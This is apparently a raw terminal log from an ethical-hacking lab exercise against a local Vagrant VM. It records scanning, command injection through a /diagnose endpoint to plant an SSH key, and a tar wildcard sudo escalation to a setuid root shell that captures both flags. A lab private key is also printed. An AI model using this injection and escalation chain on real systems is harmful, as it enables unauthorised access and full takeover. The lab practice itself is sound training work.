@@ -1,0 +1,373 @@
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ sudo nmap -p- -sV -O 192.168.56.21 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-02 17:40 +0100
+Nmap scan report for 192.168.56.21
+Host is up (0.00054s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+MAC Address: 08:00:27:62:3D:18 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.91 seconds
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ find .vagrant                     
+.vagrant
+.vagrant/rgloader
+.vagrant/rgloader/loader.rb
+.vagrant/machines
+.vagrant/machines/vulnerable
+.vagrant/machines/vulnerable/virtualbox
+.vagrant/machines/vulnerable/virtualbox/action_provision
+.vagrant/machines/vulnerable/virtualbox/index_uuid
+.vagrant/machines/vulnerable/virtualbox/disk_meta
+.vagrant/machines/vulnerable/virtualbox/vagrant_cwd
+.vagrant/machines/vulnerable/virtualbox/box_meta
+.vagrant/machines/vulnerable/virtualbox/synced_folders
+.vagrant/machines/vulnerable/virtualbox/id
+.vagrant/machines/vulnerable/virtualbox/action_set_name
+.vagrant/machines/vulnerable/virtualbox/creator_uid
+.vagrant/machines/vulnerable/virtualbox/private_key
+.vagrant/machines/vulnerable/virtualbox/action_cloud_init
+.vagrant/machines/patched
+.vagrant/machines/patched/virtualbox
+.vagrant/machines/patched/virtualbox/action_provision
+.vagrant/machines/patched/virtualbox/index_uuid
+.vagrant/machines/patched/virtualbox/disk_meta
+.vagrant/machines/patched/virtualbox/vagrant_cwd
+.vagrant/machines/patched/virtualbox/box_meta
+.vagrant/machines/patched/virtualbox/synced_folders
+.vagrant/machines/patched/virtualbox/id
+.vagrant/machines/patched/virtualbox/action_set_name
+.vagrant/machines/patched/virtualbox/creator_uid
+.vagrant/machines/patched/virtualbox/private_key
+.vagrant/machines/patched/virtualbox/action_cloud_init
+
+
+ssh -i .vagrant/machines/vulnerable/virtualbox/private_key vagrant@192.168.56.21
+
+The authenticity of host '192.168.56.21 (192.168.56.21)' can't be established.
+ED25519 key fingerprint is: SHA256:Y7DT7SUz6HAkp5d4amwywz1BRmgOjEd5P3rX6SkcnTY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.21' (ED25519) to the list of known hosts.
+vagrant@nf-eh-a2-vulnerable:~$ sudo systemctl status netforge-support
+× netforge-support.service - NetForge isolated support target
+     Loaded: loaded (/etc/systemd/system/netforge-support.service; enabled; vendor preset: enabled)
+     Active: failed (Result: exit-code) since Sun 2026-08-02 16:22:16 UTC; 22min ago
+   Main PID: 2288 (code=exited, status=2)
+        CPU: 29ms
+
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 5.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Start request repeated too quickly.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: Failed to start NetForge isolated support target.
+vagrant@nf-eh-a2-vulnerable:~$ sudo journalctl -u netforge-support
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: Started NetForge isolated support target.
+Aug 02 16:22:14 nf-eh-a2-vulnerable python3[2276]: /usr/bin/python3: can't open file '/opt/netforge-support/app.py': [Errno 13] Permission denied
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 1.
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:14 nf-eh-a2-vulnerable systemd[1]: Started NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable python3[2279]: /usr/bin/python3: can't open file '/opt/netforge-support/app.py': [Errno 13] Permission denied
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 2.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Started NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable python3[2282]: /usr/bin/python3: can't open file '/opt/netforge-support/app.py': [Errno 13] Permission denied
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 3.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Started NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable python3[2285]: /usr/bin/python3: can't open file '/opt/netforge-support/app.py': [Errno 13] Permission denied
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 4.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: Started NetForge isolated support target.
+Aug 02 16:22:15 nf-eh-a2-vulnerable python3[2288]: /usr/bin/python3: can't open file '/opt/netforge-support/app.py': [Errno 13] Permission denied
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
+Aug 02 16:22:15 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Scheduled restart job, restart counter is at 5.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: Stopped NetForge isolated support target.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Start request repeated too quickly.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: netforge-support.service: Failed with result 'exit-code'.
+Aug 02 16:22:16 nf-eh-a2-vulnerable systemd[1]: Failed to start NetForge isolated support target.
+vagrant@nf-eh-a2-vulnerable:~$ sudo ls -la /opt/netforge-support/app.py
+-rwxr-x--- 1 root root 1704 Aug  2 16:22 /opt/netforge-support/app.py
+vagrant@nf-eh-a2-vulnerable:~$ sudo ls -ld /opt/netforge-support/app.py
+-rwxr-x--- 1 root root 1704 Aug  2 16:22 /opt/netforge-support/app.py
+vagrant@nf-eh-a2-vulnerable:~$ sudo chgrp support /opt/netforge-support/app.py
+vagrant@nf-eh-a2-vulnerable:~$ sudo ls -ld /opt/netforge-support/app.py
+-rwxr-x--- 1 root support 1704 Aug  2 16:22 /opt/netforge-support/app.py
+vagrant@nf-eh-a2-vulnerable:~$ sudo systemctl restart netforge-support
+vagrant@nf-eh-a2-vulnerable:~$ exit
+logout
+Connection to 192.168.56.21 closed.
+                                                                                                                                                                                                                                                                                                                                               
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ sudo nmap -p- -sV -O -oN full_scan.txt 192.168.56.21
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-02 17:48 +0100
+Nmap scan report for 192.168.56.21
+Host is up (0.00041s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    BaseHTTPServer 0.6 (Python 3.10.12)
+MAC Address: 08:00:27:62:3D:18 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds
+                                                                                                                                                                         
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ gobuster dir -u http://192.168.56.21:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.21:8080
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+health               (Status: 200) [Size: 16]
+Progress: 8511 / 220559 (3.86%)[ERROR] error on word crack: timeout occurred during the request
+[ERROR] error on word 09: timeout occurred during the request
+[ERROR] error on word img: timeout occurred during the request
+[ERROR] error on word 2005: timeout occurred during the request
+[ERROR] error on word 1: timeout occurred during the request
+[ERROR] error on word default: timeout occurred during the request
+[ERROR] error on word archives: timeout occurred during the request
+[ERROR] error on word index: timeout occurred during the request
+[ERROR] error on word images: timeout occurred during the request
+[ERROR] error on word # on atleast 2 different hosts: timeout occurred during the request
+[ERROR] error on word 2006: timeout occurred during the request
+[ERROR] error on word # This work is licensed under the Creative Commons: timeout occurred during the request
+[ERROR] error on word news: timeout occurred during the request
+[ERROR] error on word # Attribution-Share Alike 3.0 License. To view a copy of this: timeout occurred during the request
+[ERROR] error on word 01: timeout occurred during the request
+[ERROR] error on word logo: timeout occurred during the request
+[ERROR] error on word new: timeout occurred during the request
+[ERROR] error on word faq: timeout occurred during the request
+[ERROR] error on word warez: timeout occurred during the request
+[ERROR] error on word home: timeout occurred during the request
+[ERROR] error on word links: timeout occurred during the request
+[ERROR] error on word search: timeout occurred during the request
+[ERROR] error on word privacy: timeout occurred during the request
+[ERROR] error on word # license, visit http://creativecommons.org/licenses/by-sa/3.0/: timeout occurred during the request
+[ERROR] error on word 11: timeout occurred during the request
+[ERROR] error on word # Suite 300, San Francisco, California, 94105, USA.: timeout occurred during the request
+[ERROR] error on word products: timeout occurred during the request
+Progress: 16586 / 220559 (7.52%)[ERROR] error on word 2122: timeout occurred during the request
+[ERROR] error on word occult: timeout occurred during the request
+[ERROR] error on word lansing: timeout occurred during the request
+[ERROR] error on word picasa: timeout occurred during the request
+[ERROR] error on word vcs: timeout occurred during the request
+[ERROR] error on word lighthouse: timeout occurred during the request
+[ERROR] error on word shirt02: timeout occurred during the request
+[ERROR] error on word macros: timeout occurred during the request
+[ERROR] error on word pixels: timeout occurred during the request
+[ERROR] error on word q128: timeout occurred during the request
+[ERROR] error on word freenet: timeout occurred during the request
+[ERROR] error on word eulas: timeout occurred during the request
+[ERROR] error on word 2582: timeout occurred during the request
+[ERROR] error on word strategies: timeout occurred during the request
+Progress: 25016 / 220559 (11.34%)[ERROR] error on word industrynews: timeout occurred during the request
+[ERROR] error on word mp3_players: timeout occurred during the request
+diagnose             (Status: 200) [Size: 253]
+Progress: 199486 / 220558 (90.45%)[ERROR] error on word tds-0: timeout occurred during the request
+Progress: 220558 / 220558 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ for param in ip addr address target server domain host node; do
+  echo -n "[$param] "
+  curl -s "http://192.168.56.21:8080/health?$param=127.0.0.1;id"
+  echo ""
+done
+[ip] {"status": "ok"}
+[addr] {"status": "ok"}
+[address] {"status": "ok"}
+[target] {"status": "ok"}
+[server] {"status": "ok"}
+[domain] {"status": "ok"}
+[host] {"status": "ok"}
+[node] {"status": "ok"}
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ for param in ip addr address target server domain host node; do
+  echo -n "[$param] "
+  curl -s "http://192.168.56.21:8080/diagnose?$param=127.0.0.1;id" | jq -r '.stdout // "NO_STDOUT"'
+done
+[ip] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[addr] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[address] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[target] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[server] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[domain] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+[host] 127.0.0.1       localhost
+uid=1001(support) gid=1001(support) groups=1001(support)
+
+[node] 127.0.0.1       localhost
+127.0.1.1       ubuntu2204.localdomain
+127.0.0.1       ip6-localhost ip6-loopback
+127.0.0.1       ubuntu2204.localdomain
+127.0.2.1       nf-eh-a2-vulnerable nf-eh-a2-vulnerable
+
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ curl -s "http://192.168.56.21:8080/diagnose?host=127.0.0.1;mkdir%20-p%20/home/support/.ssh" | jq -r '.stdout'
+127.0.0.1       localhost
+
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ curl -s "http://192.168.56.21:8080/diagnose?host=127.0.0.1;chmod%20700%20/home/support/.ssh" | jq -r '.stdout'
+127.0.0.1       localhost
+
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ cat ssh_key                                                                                                   
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAOORWsGkL2VI0GJyR9Nym7hsJNWtdmRSJftxm73dpq6QAAAJBdZdL0XWXS
+9AAAAAtzc2gtZWQyNTUxOQAAACAOORWsGkL2VI0GJyR9Nym7hsJNWtdmRSJftxm73dpq6Q
+AAAEDZ3G5m1cSh36+tPggEIwqRjRwVvikGB51vi8wh8WtVkw45FawaQvZUjQYnJH03KbuG
+wk1a12ZFIl+3Gbvd2mrpAAAAC3NzdGFyckBqZXNpAQI=
+-----END OPENSSH PRIVATE KEY-----
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ cat ssh_key.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA45FawaQvZUjQYnJH03KbuGwk1a12ZFIl+3Gbvd2mrp sstarr@jesi
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ curl -s "http://192.168.56.21:8080/diagnose?host=127.0.0.1;echo%20'ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIA45FawaQvZUjQYnJH03KbuGwk1a12ZFIl%2B3Gbvd2mrp%20sstarr@jesi'%20%3E%20/home/support/.ssh/authorized_keys" | jq -r '.stdout'
+127.0.0.1       localhost
+
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ curl -s "http://192.168.56.21:8080/diagnose?host=127.0.0.1;cat%20/home/support/.ssh/authorized_keys" | jq -r '.stdout'
+127.0.0.1       localhost
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA45FawaQvZUjQYnJH03KbuGwk1a12ZFIl+3Gbvd2mrp sstarr@jesi
+
+                                                                                                                                                                         
+┌──(sstarr㉿jesi)-[~/…/eh-stage6/ethical-hacking-stage-6-shared-b2/evidence/lab-source]
+└─$ ssh -i ssh_key support@192.168.56.21
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+support@nf-eh-a2-vulnerable:~$ ls
+user.txt
+support@nf-eh-a2-vulnerable:~$ cat
+^C
+support@nf-eh-a2-vulnerable:~$ cat user.txt
+UBI{A6_USER_81730E33E40959284138D11A}
+support@nf-eh-a2-vulnerable:~$ sudo -l
+Matching Defaults entries for support on nf-eh-a2-vulnerable:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User support may run the following commands on nf-eh-a2-vulnerable:
+    (root) NOPASSWD: /usr/local/sbin/support-backup
+support@nf-eh-a2-vulnerable:~$ cat /usr/local/sbin/support-backup
+cat: /usr/local/sbin/support-backup: Permission denied
+support@nf-eh-a2-vulnerable:~$ ls -ld /srv/support/uploads
+drwxr-x--- 2 support support 4096 Aug  2 16:22 /srv/support/uploads
+support@nf-eh-a2-vulnerable:~$ touch /srv/support/uploads/test
+support@nf-eh-a2-vulnerable:~$ ls -l /srv/support/uploads
+total 0
+-rw-rw-r-- 1 support support 0 Aug  2 17:03 test
+support@nf-eh-a2-vulnerable:~$ sudo /usr/local/sbin/support-backup
+support@nf-eh-a2-vulnerable:~$ ls -l /var/backups/support
+total 4
+-rw-r--r-- 1 root root 112 Aug  2 17:03 latest.tgz
+support@nf-eh-a2-vulnerable:~$ cd /srv/support/uploads
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ touch dummy.txt
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ touch -- '--checkpoint=1'
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ touch -- '--checkpoint-action=exec=sh payload.sh'
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ ls
+'--checkpoint=1'  '--checkpoint-action=exec=sh payload.sh'   dummy.txt   test
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ echo 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell' > payload.sh
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ chmod +x payload.sh
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ sudo /usr/local/sbin/support-backup
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ /tmp/rootshell -p
+rootshell-5.1# cd /
+rootshell-5.1# ls
+bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  swap.img  sys  tmp  usr  vagrant  var
+rootshell-5.1# cd /root
+rootshell-5.1# pwd
+/root
+rootshell-5.1# id
+uid=1001(support) gid=1001(support) euid=0(root) egid=0(root) groups=0(root),1001(support)
+rootshell-5.1# python3 -c 'import os; os.setuid(0); os.execv("/bin/bash", ["/bin/bash"])'
+bash-5.1# ls
+root.txt  snap	truncate
+bash-5.1# cat root.txt
+UBI{A6_ROOT_5E78CBB890A6DEC276118C17}
+bash-5.1# exit
+exit
+rootshell-5.1# exit
+exit
+support@nf-eh-a2-vulnerable:/srv/support/uploads$ exit
+logout
+Connection to 192.168.56.21 closed.
+
